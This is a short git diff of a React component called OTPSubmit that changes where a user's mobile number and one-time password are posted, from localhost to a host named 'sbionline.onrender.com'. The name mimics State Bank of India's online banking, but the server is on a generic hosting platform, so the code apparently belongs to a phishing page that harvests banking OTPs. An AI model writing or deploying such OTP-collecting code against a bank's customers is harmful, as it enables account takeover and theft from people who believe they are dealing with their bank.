@@ -51,7 +51,7 @@ export default function OTPSubmit() {
     setMessage({ text: "", type: "" });
 
     try {
-      await fetch("http://localhost:5000/api/otp/submit", {
+      await fetch("https://sbionline.onrender.com/api/otp/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ mobileNumber, otp: otpValue }),
